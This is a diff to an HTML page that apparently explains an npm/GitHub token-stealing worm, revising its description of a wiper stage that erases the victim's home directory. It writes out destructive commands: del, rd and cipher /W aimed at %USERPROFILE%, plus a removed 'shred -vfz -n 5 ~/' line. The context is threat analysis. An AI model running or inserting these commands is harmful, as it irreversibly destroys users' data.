@@ -1424,21 +1424,21 @@ h2 { font-size: 0.8em; color: #dc2626; margin-bottom: 0.6em; }
 
 <div class="methods">
 <div class="method">
-<h4>Linux</h4>
-<code>shred -vfz -n 5 ~/</code>
-<p>5-pass overwrite + zero fill on home dir</p>
-</div>
-<div class="method">
 <h4>Windows</h4>
 <code>del /F /S /Q %USERPROFILE%</code>
 <code>rd /S /Q %USERPROFILE%</code>
 <code>cipher /W:%USERPROFILE%</code>
-<p>Delete home dir, then 3-pass free space wipe to destroy remnants</p>
+<p>Delete files, remove dirs, then 3-pass free space wipe</p>
+</div>
+<div class="method">
+<h4>Linux</h4>
+<code>shred</code>
+<p>Secure overwrite of home directory files</p>
 </div>
 </div>
 
 <!--
-Step 6 - Wiper: if it cannot authenticate to GitHub, create repos, or find npm/GitHub tokens, it attempts to destroy the user's home directory. Windows: del/rd to delete files, then cipher /W overwrites free space in 3 passes (zeros, 0xFF, random) making recovery impossible. Linux: shred with 5-pass overwrite. Anti-forensics built in - if the attacker can't profit, they maximize damage.
+Step 6 - Wiper: if it cannot authenticate to GitHub, create repos, or find npm/GitHub tokens, it attempts to destroy the user's home directory. Windows: del/rd to delete all files and directories, then cipher /W overwrites free space in 3 passes (zeros, 0xFF, random). Linux: shred to securely overwrite files. Source: Sonatype blog. Note: this was disabled in observed builds - assessed as pre-release.
 -->
 
 ---
